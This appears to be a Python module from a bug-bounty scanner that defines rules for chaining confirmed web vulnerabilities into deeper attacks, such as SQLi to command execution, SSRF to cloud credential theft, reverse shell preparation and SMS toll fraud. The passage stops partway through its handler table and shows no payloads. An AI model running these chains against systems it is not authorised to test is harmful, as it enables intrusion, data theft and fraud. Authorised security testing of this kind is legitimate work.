"""
Vulnerability Chain Engine - Enterprise Edition

Implements intelligent vulnerability chaining:
- SQLi → RCE (via UDF, COPY TO PROGRAM, xp_cmdshell)
- LFI → Credential Extraction
- IDOR → Mass Data Enumeration
- Auth Bypass → Privilege Escalation
- SSRF → Cloud Metadata / Internal Scan
- XXE → File Read / SSRF
- Deserialization → RCE

Philosophy: "Vulnerabilities discover vulnerabilities"
A finding from one scanner triggers deeper testing by others.

Usage:
    from scanning.vuln_chain_engine import VulnerabilityChainEngine

    engine = VulnerabilityChainEngine(settings)
    engine.set_context(technologies=["php", "mysql"], target="https://example.com")

    # Process a finding and get chain results
    chain_findings = await engine.process_finding(sqli_finding)
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set
import asyncio
import logging
import os
import re
from urllib.parse import urljoin, urlparse

import httpx

from utils.logger import get_logger
from utils.shared_findings_store import SharedFindingsStore, VulnType

logger = get_logger(__name__)

# ═══════════════════════════════════════════════════════════════════════════════
# SAFETY MODE CONFIGURATION
# Ensures all chain testing respects HackerOne/Bugcrowd program policies
# ═══════════════════════════════════════════════════════════════════════════════

SAFE_MODE = os.environ.get("PHANTOM_SAFE_MODE", "safe").lower()

# Chain testing limits based on safety mode
CHAIN_TESTING_LIMITS = {
    "passive": {
        "allow_active_testing": False,  # No active exploitation
        "allow_speculative": True,       # Can suggest attack paths
        "max_requests_per_chain": 0,     # No additional requests
    },
    "safe": {
        "allow_active_testing": False,   # No active exploitation
        "allow_speculative": True,        # Can suggest attack paths
        "max_requests_per_chain": 0,      # No additional requests
    },
    "cautious": {
        "allow_active_testing": True,     # Limited testing
        "allow_speculative": True,
        "max_requests_per_chain": 3,      # Max 3 requests to verify
    },
    "standard": {
        "allow_active_testing": True,
        "allow_speculative": True,
        "max_requests_per_chain": 10,
    },
    "aggressive": {
        "allow_active_testing": True,
        "allow_speculative": True,
        "max_requests_per_chain": 50,     # Requires explicit authorization
    },
}

# Get current limits
CHAIN_LIMITS = CHAIN_TESTING_LIMITS.get(SAFE_MODE, CHAIN_TESTING_LIMITS["safe"])

def is_chain_testing_allowed() -> bool:
    """Check if active chain testing is allowed in current mode."""
    return CHAIN_LIMITS.get("allow_active_testing", False)

def is_speculative_allowed() -> bool:
    """Check if speculative chain suggestions are allowed."""
    return CHAIN_LIMITS.get("allow_speculative", True)


class ChainTrigger(Enum):
    """Vulnerability types that can trigger chains."""
    SQLI_CONFIRMED = auto()
    SQLI_BLIND_CONFIRMED = auto()
    LFI_CONFIRMED = auto()
    RFI_CONFIRMED = auto()
    IDOR_CONFIRMED = auto()
    AUTH_BYPASS = auto()
    DEFAULT_CREDENTIALS = auto()
    OPEN_REDIRECT = auto()
    SSRF_CONFIRMED = auto()
    XXE_CONFIRMED = auto()
    DESERIALIZATION = auto()
    COMMAND_INJECTION = auto()
    SSTI_CONFIRMED = auto()
    PATH_TRAVERSAL = auto()
    INFO_DISCLOSURE = auto()
    WEAK_CRYPTO = auto()
    SESSION_FIXATION = auto()
    # ═══════════════════════════════════════════════════════════════════
    # CLOUD-SPECIFIC TRIGGERS (AWS, CloudFront, Azure, GCP)
    # ═══════════════════════════════════════════════════════════════════
    AWS_EXPOSURE = auto()           # AWS credentials or config exposed
    CLOUDFRONT_BYPASS = auto()      # CloudFront origin bypass
    S3_MISCONFIGURATION = auto()    # S3 bucket issues
    CLOUD_METADATA = auto()         # Cloud metadata access
    API_KEY_EXPOSURE = auto()       # API keys in responses
    JWT_WEAKNESS = auto()           # JWT vulnerabilities
    CORS_MISCONFIGURATION = auto()  # CORS issues enabling attacks
    CACHE_POISONING = auto()        # Cache poisoning opportunities
    # ═══════════════════════════════════════════════════════════════════
    # CROSS-MODULE TRIGGERS (for causal chain composition)
    # ═══════════════════════════════════════════════════════════════════
    XSS_CONFIRMED = auto()          # XSS (reflected/stored) confirmed
    DOM_XSS_CONFIRMED = auto()      # DOM XSS confirmed (browser-based)
    NOSQL_INJECTION = auto()        # NoSQL injection confirmed
    SESSION_WEAKNESS = auto()       # Session/token abuse confirmed
    BUSINESS_LOGIC = auto()         # Business logic flaw confirmed
    # SPECULATIVE TRIGGERS (based on technology, not confirmed vulns)
    SPECULATIVE_AWS = auto()        # AWS detected, suggest attack paths
    SPECULATIVE_API = auto()        # API detected, suggest attack paths
    # ═══════════════════════════════════════════════════════════════════
    # COMMUNICATIONS API TRIGGERS (Twilio, SendGrid, Authy)
    # High-value bounty targets - SMS pumping, toll fraud, enumeration
    # ═══════════════════════════════════════════════════════════════════
    PHONE_ENUMERATION = auto()      # CVE-2024-39891 pattern - phone number enumeration
    SMS_ABUSE_ENDPOINT = auto()     # Unprotected SMS/Voice endpoints
    TWILIO_CREDENTIAL = auto()      # Twilio Account SID/Auth Token exposure
    SENDGRID_CREDENTIAL = auto()    # SendGrid API key exposure
    VERIFY_RATE_LIMIT = auto()      # Rate limit bypass on verification
    AUTH_NULL_INJECTION = auto()    # CVE-2020-24655 pattern - null injection bypass
    SPECULATIVE_COMMS = auto()      # Communications platform detected


class ChainPriority(Enum):
    """Priority levels for chain execution."""
    CRITICAL = 10  # Execute immediately (RCE chains)
    HIGH = 8       # Execute soon (credential extraction)
    MEDIUM = 5     # Execute when convenient
    LOW = 3        # Execute if time permits
    INFO = 1       # Informational only


@dataclass
class ChainRule:
    """Rule defining when and how to chain vulnerabilities."""
    trigger: ChainTrigger
    action: str
    priority: ChainPriority
    description: str
    condition: Optional[Callable[[Dict[str, Any]], bool]] = None
    required_context: Set[str] = field(default_factory=set)
    timeout: int = 60  # seconds


@dataclass
class ChainResult:
    """Result of executing a chain action."""
    success: bool
    action: str
    findings: List[Dict[str, Any]]
    evidence: Dict[str, Any]
    error: Optional[str] = None
    execution_time: float = 0.0


class VulnerabilityChainEngine:
    """
    Engine for intelligent vulnerability chaining.

    Processes findings from scanners and triggers deeper
    exploitation based on confirmed vulnerabilities.
    """

    # Mapping of vulnerability types to triggers
    VULN_TYPE_MAPPING: Dict[str, ChainTrigger] = {
        # SQLi variants
        "sql_injection": ChainTrigger.SQLI_CONFIRMED,
        "sqli": ChainTrigger.SQLI_CONFIRMED,
        "blind_sql_injection": ChainTrigger.SQLI_BLIND_CONFIRMED,
        "time_based_sqli": ChainTrigger.SQLI_BLIND_CONFIRMED,

        # File inclusion
        "local_file_inclusion": ChainTrigger.LFI_CONFIRMED,
        "lfi": ChainTrigger.LFI_CONFIRMED,
        "path_traversal": ChainTrigger.PATH_TRAVERSAL,
        "remote_file_inclusion": ChainTrigger.RFI_CONFIRMED,
        "rfi": ChainTrigger.RFI_CONFIRMED,

        # Access control
        "idor": ChainTrigger.IDOR_CONFIRMED,
        "insecure_direct_object_reference": ChainTrigger.IDOR_CONFIRMED,
        "broken_access_control": ChainTrigger.IDOR_CONFIRMED,

        # Authentication
        "authentication_bypass": ChainTrigger.AUTH_BYPASS,
        "auth_bypass": ChainTrigger.AUTH_BYPASS,
        "default_credentials": ChainTrigger.DEFAULT_CREDENTIALS,
        "weak_credentials": ChainTrigger.DEFAULT_CREDENTIALS,

        # Redirects
        "open_redirect": ChainTrigger.OPEN_REDIRECT,
        "url_redirect": ChainTrigger.OPEN_REDIRECT,

        # SSRF/XXE
        "ssrf": ChainTrigger.SSRF_CONFIRMED,
        "server_side_request_forgery": ChainTrigger.SSRF_CONFIRMED,
        "xxe": ChainTrigger.XXE_CONFIRMED,
        "xml_external_entity": ChainTrigger.XXE_CONFIRMED,

        # Code execution
        "deserialization": ChainTrigger.DESERIALIZATION,
        "insecure_deserialization": ChainTrigger.DESERIALIZATION,
        "command_injection": ChainTrigger.COMMAND_INJECTION,
        "cmdi": ChainTrigger.COMMAND_INJECTION,
        "rce": ChainTrigger.COMMAND_INJECTION,

        # Template injection
        "ssti": ChainTrigger.SSTI_CONFIRMED,
        "template_injection": ChainTrigger.SSTI_CONFIRMED,

        # XSS (cross-module chain triggers)
        "xss": ChainTrigger.XSS_CONFIRMED,
        "cross_site_scripting": ChainTrigger.XSS_CONFIRMED,
        "reflected_xss": ChainTrigger.XSS_CONFIRMED,
        "stored_xss": ChainTrigger.XSS_CONFIRMED,
        "template_injection_xss": ChainTrigger.XSS_CONFIRMED,
        "dom_xss": ChainTrigger.DOM_XSS_CONFIRMED,
        "dom_based_xss": ChainTrigger.DOM_XSS_CONFIRMED,

        # NoSQL injection
        "nosql_injection": ChainTrigger.NOSQL_INJECTION,
        "nosqli": ChainTrigger.NOSQL_INJECTION,
        "mongodb_injection": ChainTrigger.NOSQL_INJECTION,

        # Session/Token abuse
        "session_abuse": ChainTrigger.SESSION_WEAKNESS,
        "jwt_replay": ChainTrigger.SESSION_WEAKNESS,
        "session_fixation": ChainTrigger.SESSION_FIXATION,
        "token_not_invalidated": ChainTrigger.SESSION_WEAKNESS,

        # Business logic
        "business_logic": ChainTrigger.BUSINESS_LOGIC,
        "price_manipulation": ChainTrigger.BUSINESS_LOGIC,
        "workflow_bypass": ChainTrigger.BUSINESS_LOGIC,

        # Information disclosure
        "information_disclosure": ChainTrigger.INFO_DISCLOSURE,
        "sensitive_data_exposure": ChainTrigger.INFO_DISCLOSURE,

        # ═══════════════════════════════════════════════════════════════════
        # CLOUD-SPECIFIC MAPPINGS
        # ═══════════════════════════════════════════════════════════════════
        "aws_exposure": ChainTrigger.AWS_EXPOSURE,
        "aws_key_exposure": ChainTrigger.AWS_EXPOSURE,
        "aws_credential": ChainTrigger.AWS_EXPOSURE,
        "cloudfront_bypass": ChainTrigger.CLOUDFRONT_BYPASS,
        "cdn_bypass": ChainTrigger.CLOUDFRONT_BYPASS,
        "origin_bypass": ChainTrigger.CLOUDFRONT_BYPASS,
        "s3_misconfiguration": ChainTrigger.S3_MISCONFIGURATION,
        "s3_bucket": ChainTrigger.S3_MISCONFIGURATION,
        "cloud_metadata": ChainTrigger.CLOUD_METADATA,
        "metadata_exposure": ChainTrigger.CLOUD_METADATA,
        "api_key_exposure": ChainTrigger.API_KEY_EXPOSURE,
        "api_key": ChainTrigger.API_KEY_EXPOSURE,
        "jwt_weakness": ChainTrigger.JWT_WEAKNESS,
        "jwt_vulnerability": ChainTrigger.JWT_WEAKNESS,
        "jwt": ChainTrigger.JWT_WEAKNESS,
        "cors_misconfiguration": ChainTrigger.CORS_MISCONFIGURATION,
        "cors": ChainTrigger.CORS_MISCONFIGURATION,
        "cache_poisoning": ChainTrigger.CACHE_POISONING,
        "web_cache": ChainTrigger.CACHE_POISONING,

        # ═══════════════════════════════════════════════════════════════════
        # COMMUNICATIONS API MAPPINGS (Twilio, SendGrid, Authy)
        # ═══════════════════════════════════════════════════════════════════
        "phone_enumeration": ChainTrigger.PHONE_ENUMERATION,
        "phone_number_enumeration": ChainTrigger.PHONE_ENUMERATION,
        "user_enumeration": ChainTrigger.PHONE_ENUMERATION,
        "sms_abuse": ChainTrigger.SMS_ABUSE_ENDPOINT,
        "sms_pumping": ChainTrigger.SMS_ABUSE_ENDPOINT,
        "toll_fraud": ChainTrigger.SMS_ABUSE_ENDPOINT,
        "irsf": ChainTrigger.SMS_ABUSE_ENDPOINT,
        "twilio_credential": ChainTrigger.TWILIO_CREDENTIAL,
        "twilio_account_sid": ChainTrigger.TWILIO_CREDENTIAL,
        "twilio_auth_token": ChainTrigger.TWILIO_CREDENTIAL,
        "sendgrid_key": ChainTrigger.SENDGRID_CREDENTIAL,
        "sendgrid_api_key": ChainTrigger.SENDGRID_CREDENTIAL,
        "verify_rate_limit": ChainTrigger.VERIFY_RATE_LIMIT,
        "otp_brute_force": ChainTrigger.VERIFY_RATE_LIMIT,
        "auth_null_injection": ChainTrigger.AUTH_NULL_INJECTION,
        "authentication_bypass": ChainTrigger.AUTH_NULL_INJECTION,
    }

    # Chain rules defining what actions to take for each trigger
    CHAIN_RULES: List[ChainRule] = [
        # ============================================
        # SQLi → RCE Chains
        # ============================================
        ChainRule(
            trigger=ChainTrigger.SQLI_CONFIRMED,
            action="sqli_mysql_udf_rce",
            priority=ChainPriority.CRITICAL,
            description="MySQL SQLi → UDF-based RCE",
            condition=lambda ctx: ctx.get("db_type") == "mysql",
            required_context={"db_type"},
        ),
        ChainRule(
            trigger=ChainTrigger.SQLI_CONFIRMED,
            action="sqli_postgres_copy_rce",
            priority=ChainPriority.CRITICAL,
            description="PostgreSQL SQLi → COPY TO PROGRAM RCE",
            condition=lambda ctx: ctx.get("db_type") == "postgresql",
            required_context={"db_type"},
        ),
        ChainRule(
            trigger=ChainTrigger.SQLI_CONFIRMED,
            action="sqli_mssql_xp_cmdshell",
            priority=ChainPriority.CRITICAL,
            description="MSSQL SQLi → xp_cmdshell RCE",
            condition=lambda ctx: ctx.get("db_type") == "mssql",
            required_context={"db_type"},
        ),
        ChainRule(
            trigger=ChainTrigger.SQLI_CONFIRMED,
            action="sqli_data_extraction",
            priority=ChainPriority.HIGH,
            description="SQLi → Extract database schema and data",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.SQLI_CONFIRMED,
            action="sqli_file_read",
            priority=ChainPriority.HIGH,
            description="SQLi → Read files via LOAD_FILE/UTL_FILE",
            condition=None,
        ),

        # ============================================
        # LFI → Credential/Source Extraction
        # ============================================
        ChainRule(
            trigger=ChainTrigger.LFI_CONFIRMED,
            action="lfi_extract_passwd",
            priority=ChainPriority.HIGH,
            description="LFI → Extract /etc/passwd and system files",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.LFI_CONFIRMED,
            action="lfi_extract_config",
            priority=ChainPriority.HIGH,
            description="LFI → Extract application config files",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.LFI_CONFIRMED,
            action="lfi_php_wrappers",
            priority=ChainPriority.CRITICAL,
            description="LFI + PHP → php://filter source code extraction",
            condition=lambda ctx: "php" in ctx.get("technologies", []),
            required_context={"technologies"},
        ),
        ChainRule(
            trigger=ChainTrigger.LFI_CONFIRMED,
            action="lfi_log_poisoning",
            priority=ChainPriority.CRITICAL,
            description="LFI → Log poisoning for RCE",
            condition=lambda ctx: "php" in ctx.get("technologies", []) or "apache" in ctx.get("technologies", []),
        ),
        ChainRule(
            trigger=ChainTrigger.LFI_CONFIRMED,
            action="lfi_proc_environ",
            priority=ChainPriority.MEDIUM,
            description="LFI → /proc/self/environ for secrets",
            condition=None,
        ),

        # ============================================
        # IDOR → Mass Data Enumeration
        # ============================================
        ChainRule(
            trigger=ChainTrigger.IDOR_CONFIRMED,
            action="idor_enumerate_ids",
            priority=ChainPriority.HIGH,
            description="IDOR → Enumerate all accessible IDs",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.IDOR_CONFIRMED,
            action="idor_horizontal_escalation",
            priority=ChainPriority.HIGH,
            description="IDOR → Access other users' data",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.IDOR_CONFIRMED,
            action="idor_vertical_escalation",
            priority=ChainPriority.CRITICAL,
            description="IDOR → Access admin/privileged resources",
            condition=None,
        ),

        # ============================================
        # Auth Bypass → Privilege Escalation
        # ============================================
        ChainRule(
            trigger=ChainTrigger.AUTH_BYPASS,
            action="auth_test_admin_endpoints",
            priority=ChainPriority.CRITICAL,
            description="Auth bypass → Test admin functionality",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.AUTH_BYPASS,
            action="auth_enumerate_users",
            priority=ChainPriority.HIGH,
            description="Auth bypass → Enumerate users/roles",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.DEFAULT_CREDENTIALS,
            action="default_creds_authenticated_scan",
            priority=ChainPriority.HIGH,
            description="Default creds → Full authenticated scan",
            condition=None,
        ),

        # ============================================
        # SSRF → Internal Reconnaissance
        # ============================================
        ChainRule(
            trigger=ChainTrigger.SSRF_CONFIRMED,
            action="ssrf_cloud_metadata",
            priority=ChainPriority.CRITICAL,
            description="SSRF → AWS/GCP/Azure metadata extraction",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.SSRF_CONFIRMED,
            action="ssrf_internal_port_scan",
            priority=ChainPriority.HIGH,
            description="SSRF → Internal network port scan",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.SSRF_CONFIRMED,
            action="ssrf_internal_services",
            priority=ChainPriority.HIGH,
            description="SSRF → Access internal services (Redis, MongoDB, etc.)",
            condition=None,
        ),

        # ============================================
        # XXE → File Read & SSRF
        # ============================================
        ChainRule(
            trigger=ChainTrigger.XXE_CONFIRMED,
            action="xxe_file_extraction",
            priority=ChainPriority.HIGH,
            description="XXE → Extract sensitive files",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.XXE_CONFIRMED,
            action="xxe_ssrf",
            priority=ChainPriority.HIGH,
            description="XXE → SSRF to internal services",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.XXE_CONFIRMED,
            action="xxe_oob_exfiltration",
            priority=ChainPriority.CRITICAL,
            description="XXE → Out-of-band data exfiltration",
            condition=None,
        ),

        # ============================================
        # Deserialization → RCE
        # ============================================
        ChainRule(
            trigger=ChainTrigger.DESERIALIZATION,
            action="deser_java_gadget",
            priority=ChainPriority.CRITICAL,
            description="Java deserialization → ysoserial gadget chain RCE",
            condition=lambda ctx: "java" in ctx.get("technologies", []),
            required_context={"technologies"},
        ),
        ChainRule(
            trigger=ChainTrigger.DESERIALIZATION,
            action="deser_php_gadget",
            priority=ChainPriority.CRITICAL,
            description="PHP deserialization → Object injection RCE",
            condition=lambda ctx: "php" in ctx.get("technologies", []),
            required_context={"technologies"},
        ),
        ChainRule(
            trigger=ChainTrigger.DESERIALIZATION,
            action="deser_python_pickle",
            priority=ChainPriority.CRITICAL,
            description="Python pickle → RCE",
            condition=lambda ctx: "python" in ctx.get("technologies", []),
            required_context={"technologies"},
        ),
        ChainRule(
            trigger=ChainTrigger.DESERIALIZATION,
            action="deser_dotnet_gadget",
            priority=ChainPriority.CRITICAL,
            description=".NET deserialization → ysoserial.net RCE",
            condition=lambda ctx: any(t in ctx.get("technologies", []) for t in ["asp.net", ".net", "csharp"]),
            required_context={"technologies"},
        ),

        # ============================================
        # SSTI → RCE
        # ============================================
        ChainRule(
            trigger=ChainTrigger.SSTI_CONFIRMED,
            action="ssti_rce",
            priority=ChainPriority.CRITICAL,
            description="SSTI → Template engine RCE",
            condition=None,
        ),

        # ════════════════════════════════════════════════════════════════
        # CROSS-MODULE CAUSAL CHAINS (real composition via SharedFindingsStore)
        # These query findings from OTHER modules to build attack chains
        # ════════════════════════════════════════════════════════════════

        # XSS → Token/Session chains
        ChainRule(
            trigger=ChainTrigger.XSS_CONFIRMED,
            action="xss_token_theft_chain",
            priority=ChainPriority.CRITICAL,
            description="XSS → Token theft → Account takeover (cross-module)",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.DOM_XSS_CONFIRMED,
            action="xss_token_theft_chain",
            priority=ChainPriority.CRITICAL,
            description="DOM XSS → Token theft → Account takeover (cross-module)",
            condition=None,
        ),

        # SQLi → Credential extraction → Auth bypass chain
        ChainRule(
            trigger=ChainTrigger.SQLI_CONFIRMED,
            action="sqli_credential_auth_chain",
            priority=ChainPriority.CRITICAL,
            description="SQLi extracted credentials → Login as admin (cross-module)",
            condition=None,
        ),

        # NoSQL → Data extraction → Auth bypass chain
        ChainRule(
            trigger=ChainTrigger.NOSQL_INJECTION,
            action="nosql_auth_bypass_chain",
            priority=ChainPriority.CRITICAL,
            description="NoSQL injection → Data extraction → Auth bypass (cross-module)",
            condition=None,
        ),

        # Session weakness + XSS → Persistent ATO
        ChainRule(
            trigger=ChainTrigger.SESSION_WEAKNESS,
            action="session_xss_ato_chain",
            priority=ChainPriority.CRITICAL,
            description="Session weakness + XSS → Persistent account takeover (cross-module)",
            condition=None,
        ),

        # Business logic + IDOR → Financial fraud
        ChainRule(
            trigger=ChainTrigger.BUSINESS_LOGIC,
            action="business_idor_fraud_chain",
            priority=ChainPriority.HIGH,
            description="Business logic + IDOR → Financial fraud chain (cross-module)",
            condition=None,
        ),

        # SSTI with RCE → Post-exploitation chain
        ChainRule(
            trigger=ChainTrigger.SSTI_CONFIRMED,
            action="ssti_post_exploit_chain",
            priority=ChainPriority.CRITICAL,
            description="SSTI RCE → Credential theft + lateral movement (cross-module)",
            condition=None,
        ),

        # XXE → Credential extraction from files → Auth chain
        ChainRule(
            trigger=ChainTrigger.XXE_CONFIRMED,
            action="xxe_credential_chain",
            priority=ChainPriority.CRITICAL,
            description="XXE file read → Credential extraction → Auth test (cross-module)",
            condition=None,
        ),

        # ============================================
        # Command Injection → Post-Exploitation
        # ============================================
        ChainRule(
            trigger=ChainTrigger.COMMAND_INJECTION,
            action="cmdi_reverse_shell_prep",
            priority=ChainPriority.CRITICAL,
            description="CMDi → Prepare reverse shell commands",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.COMMAND_INJECTION,
            action="cmdi_data_exfiltration",
            priority=ChainPriority.HIGH,
            description="CMDi → Extract sensitive data",
            condition=None,
        ),

        # ============================================
        # Open Redirect → OAuth/Auth Token Theft
        # ============================================
        ChainRule(
            trigger=ChainTrigger.OPEN_REDIRECT,
            action="redirect_oauth_theft",
            priority=ChainPriority.HIGH,
            description="Open redirect → OAuth token theft chain",
            condition=lambda ctx: any(t in ctx.get("technologies", []) for t in ["oauth", "oauth2", "oidc"]),
        ),
        ChainRule(
            trigger=ChainTrigger.OPEN_REDIRECT,
            action="redirect_phishing_demo",
            priority=ChainPriority.MEDIUM,
            description="Open redirect → Phishing chain demonstration",
            condition=None,
        ),

        # ============================================
        # Information Disclosure → Targeted Exploitation
        # ============================================
        ChainRule(
            trigger=ChainTrigger.INFO_DISCLOSURE,
            action="info_cve_search",
            priority=ChainPriority.HIGH,
            description="Info disclosure → CVE search for disclosed versions",
            condition=lambda ctx: ctx.get("disclosed_software") is not None,
        ),
        ChainRule(
            trigger=ChainTrigger.INFO_DISCLOSURE,
            action="info_credential_search",
            priority=ChainPriority.CRITICAL,
            description="Info disclosure → Search for leaked credentials",
            condition=lambda ctx: ctx.get("disclosure_type") == "source_code",
        ),

        # ════════════════════════════════════════════════════════════════════
        # AWS/CLOUDFRONT-SPECIFIC CHAINS ($10k-$50k bounties on AWS vulns)
        # ════════════════════════════════════════════════════════════════════
        ChainRule(
            trigger=ChainTrigger.AWS_EXPOSURE,
            action="aws_credential_exploitation",
            priority=ChainPriority.CRITICAL,
            description="AWS credentials → Full account takeover",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.CLOUDFRONT_BYPASS,
            action="cloudfront_origin_access",
            priority=ChainPriority.CRITICAL,
            description="CloudFront bypass → Direct origin access",
            condition=lambda ctx: "cloudfront" in str(ctx.get("technologies", [])).lower(),
        ),
        ChainRule(
            trigger=ChainTrigger.S3_MISCONFIGURATION,
            action="s3_data_exfiltration",
            priority=ChainPriority.CRITICAL,
            description="S3 misconfiguration → Data exfiltration",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.SSRF_CONFIRMED,
            action="ssrf_aws_imds_v2",
            priority=ChainPriority.CRITICAL,
            description="SSRF → AWS IMDSv2 token theft",
            condition=lambda ctx: any("aws" in str(t).lower() for t in ctx.get("technologies", [])),
        ),
        ChainRule(
            trigger=ChainTrigger.CLOUD_METADATA,
            action="cloud_metadata_credential_theft",
            priority=ChainPriority.CRITICAL,
            description="Cloud metadata → IAM credential extraction",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.API_KEY_EXPOSURE,
            action="api_key_account_takeover",
            priority=ChainPriority.CRITICAL,
            description="API key exposure → Account/service takeover",
            condition=None,
        ),

        # ════════════════════════════════════════════════════════════════════
        # JWT CHAIN ATTACKS ($5k-$20k bounties)
        # ════════════════════════════════════════════════════════════════════
        ChainRule(
            trigger=ChainTrigger.JWT_WEAKNESS,
            action="jwt_algorithm_confusion",
            priority=ChainPriority.CRITICAL,
            description="JWT weakness → Algorithm confusion attack",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.JWT_WEAKNESS,
            action="jwt_privilege_escalation",
            priority=ChainPriority.CRITICAL,
            description="JWT weakness → Forge admin tokens",
            condition=None,
        ),

        # ════════════════════════════════════════════════════════════════════
        # CORS → TOKEN THEFT CHAINS
        # ════════════════════════════════════════════════════════════════════
        ChainRule(
            trigger=ChainTrigger.CORS_MISCONFIGURATION,
            action="cors_credential_theft",
            priority=ChainPriority.HIGH,
            description="CORS misconfiguration → Steal auth tokens via XHR",
            condition=None,
        ),

        # ════════════════════════════════════════════════════════════════════
        # CACHE POISONING CHAINS (HIGH-VALUE on CDNs like CloudFront)
        # ════════════════════════════════════════════════════════════════════
        ChainRule(
            trigger=ChainTrigger.CACHE_POISONING,
            action="cache_stored_xss",
            priority=ChainPriority.CRITICAL,
            description="Cache poisoning → Persistent XSS via CDN cache",
            condition=lambda ctx: any("cloudfront" in str(t).lower() for t in ctx.get("technologies", [])),
        ),
        ChainRule(
            trigger=ChainTrigger.CACHE_POISONING,
            action="cache_dos_chain",
            priority=ChainPriority.HIGH,
            description="Cache poisoning → DoS via cached error responses",
            condition=None,
        ),

        # ════════════════════════════════════════════════════════════════════
        # SPECULATIVE CHAINS (Technology-based, even without confirmed vulns)
        # These suggest attack paths based on detected tech stack
        # ════════════════════════════════════════════════════════════════════
        ChainRule(
            trigger=ChainTrigger.SPECULATIVE_AWS,
            action="speculative_aws_attack_paths",
            priority=ChainPriority.MEDIUM,
            description="AWS detected → Suggest cloud-specific attack paths",
            condition=lambda ctx: any("aws" in str(t).lower() for t in ctx.get("technologies", [])),
        ),
        ChainRule(
            trigger=ChainTrigger.SPECULATIVE_API,
            action="speculative_api_attack_paths",
            priority=ChainPriority.MEDIUM,
            description="API detected → Suggest API-specific attack paths",
            condition=lambda ctx: "api" in ctx.get("target", "").lower(),
        ),

        # ════════════════════════════════════════════════════════════════════
        # COMMUNICATIONS API CHAINS (Twilio, SendGrid, Authy)
        # High-value bounty targets - $5k-$50k range for critical findings
        # ════════════════════════════════════════════════════════════════════
        ChainRule(
            trigger=ChainTrigger.PHONE_ENUMERATION,
            action="comms_phone_enumeration_chain",
            priority=ChainPriority.HIGH,
            description="Phone enumeration → Mass user data collection (CVE-2024-39891 pattern)",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.SMS_ABUSE_ENDPOINT,
            action="comms_sms_pumping_chain",
            priority=ChainPriority.CRITICAL,
            description="SMS abuse → Toll fraud / IRSF attack demonstration",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.TWILIO_CREDENTIAL,
            action="comms_twilio_credential_chain",
            priority=ChainPriority.CRITICAL,
            description="Twilio credential → Full account takeover / toll fraud",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.SENDGRID_CREDENTIAL,
            action="comms_sendgrid_credential_chain",
            priority=ChainPriority.CRITICAL,
            description="SendGrid credential → Email sending / phishing potential",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.VERIFY_RATE_LIMIT,
            action="comms_verify_abuse_chain",
            priority=ChainPriority.HIGH,
            description="Verify rate limit bypass → OTP brute force / SMS pumping",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.AUTH_NULL_INJECTION,
            action="comms_auth_bypass_chain",
            priority=ChainPriority.CRITICAL,
            description="Auth bypass → Full authentication bypass (CVE-2020-24655 pattern)",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.SPECULATIVE_COMMS,
            action="speculative_comms_attack_paths",
            priority=ChainPriority.MEDIUM,
            description="Communications platform detected → Suggest SMS/voice attack paths",
            condition=lambda ctx: any(
                d in ctx.get("target", "").lower()
                for d in ["twilio", "sendgrid", "authy", "segment"]
            ),
        ),
    ]

    def __init__(self, settings: Optional[Any] = None):
        """Initialize the chain engine."""
        self.settings = settings
        self.context: Dict[str, Any] = {}
        self.findings_processed: Set[str] = set()
        self.chain_results: List[ChainResult] = []
        self.http_client: Optional[httpx.AsyncClient] = None
        self.timeout = httpx.Timeout(30.0)

        # Action handlers (will be loaded from chain_actions/)
        self._action_handlers: Dict[str, Callable] = {}
        self._load_action_handlers()

    def _load_action_handlers(self) -> None:
        """Load action handlers from chain_actions modules."""
        # Register built-in handlers
        self._action_handlers = {
            # SQLi chains
            "sqli_mysql_udf_rce": self._sqli_mysql_udf_rce,
            "sqli_postgres_copy_rce": self._sqli_postgres_copy_rce,
            "sqli_mssql_xp_cmdshell": self._sqli_mssql_xp_cmdshell,
            "sqli_data_extraction": self._sqli_data_extraction,
            "sqli_file_read": self._sqli_file_read,

            # LFI chains
            "lfi_extract_passwd": self._lfi_extract_passwd,
            "lfi_extract_config": self._lfi_extract_config,
            "lfi_php_wrappers": self._lfi_php_wrappers,
            "lfi_log_poisoning": self._lfi_log_poisoning,
            "lfi_proc_environ": self._lfi_proc_environ,

            # IDOR chains
            "idor_enumerate_ids": self._idor_enumerate_ids,
            "idor_horizontal_escalation": self._idor_horizontal_escalation,
            "idor_vertical_escalation": self._idor_vertical_escalation,

            # Auth chains
            "auth_test_admin_endpoints": self._auth_test_admin_endpoints,
            "auth_enumerate_users": self._auth_enumerate_users,
            "default_creds_authenticated_scan": self._default_creds_authenticated_scan,

            # SSRF chains
            "ssrf_cloud_metadata": self._ssrf_cloud_metadata,
            "ssrf_internal_port_scan": self._ssrf_internal_port_scan,
            "ssrf_internal_services": self._ssrf_internal_services,

            # XXE chains
            "xxe_file_extraction": self._xxe_file_extraction,
            "xxe_ssrf": self._xxe_ssrf,
            "xxe_oob_exfiltration": self._xxe_oob_exfiltration,

            # Deserialization chains
            "deser_java_gadget": self._deser_java_gadget,
            "deser_php_gadget": self._deser_php_gadget,
            "deser_python_pickle": self._deser_python_pickle,
            "deser_dotnet_gadget": self._deser_dotnet_gadget,

            # SSTI chains
            "ssti_rce": self._ssti_rce,

